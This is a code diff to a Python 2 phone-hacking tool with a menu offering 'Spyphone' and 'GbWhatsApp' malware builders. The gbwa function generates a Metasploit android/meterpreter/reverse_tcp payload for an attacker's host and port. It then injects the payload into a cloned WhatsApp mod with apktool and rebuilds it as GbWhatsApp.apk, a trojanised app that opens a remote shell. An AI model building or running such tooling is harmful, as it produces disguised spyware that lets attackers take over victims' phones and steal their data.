@@ -90,11 +90,11 @@ def payload():
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
 def gbwa():
-	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/GbWhatsApp && mv -f GbWhatsApp Malware/A")
 	os.system("cd Malware && rm -rf payload.apk payload A")
+	os.system("git clone http://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware/A")
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
-	os.system("rm -rf Malware/A/smali/com/metasploit/stage")
+	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
 	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit")
 	os.system("cd Malware && apktool b A -o GbWhatsApp.apk")
 	os.system("cd Malware && rm -rf payload.apk payload A")
@@ -162,8 +162,8 @@ def malware():
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
-    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
-    print '\x1b[1;91m3.\x1b[1;97mGbWhatsApp'
+    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'+cyan+' *New'
+    print '\x1b[1;91m3.\x1b[1;97mGbWhatsApp'+cyan+' *New '
     print '\r\x1b[1;91m__________________________________________«Back» '
     
         	
@@ -237,9 +237,7 @@ def update():
 	os.system('python2 install.py')
 	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	home()
-    
 	
-    
 def baru():
     os.system('clear')
     logo()
@@ -263,6 +261,7 @@ def baru():
     os.system('mv '+str(name)+'.apk /storage/emulated/0/')
     time.sleep(4)
     os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home()
   
     
@@ -277,7 +276,6 @@ def menu():
     print '\x1b[1;91m5.\x1b[1;97mExit'
     print '\r\x1b[1;91m__________________________________________«» '
  
-menu();
 
 def pilih():
     zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
@@ -285,8 +283,8 @@ def pilih():
         print '\x1b[1;91m[!] Can\'t empty'
         time.sleep(1)
         os.system('clear')
-        menu()
-        pilih()
+        home()
+        
     else:
         if zedd == '1':
             sisip()
@@ -315,5 +313,5 @@ def home():
                    
         
 
-pilih();
+home()
     
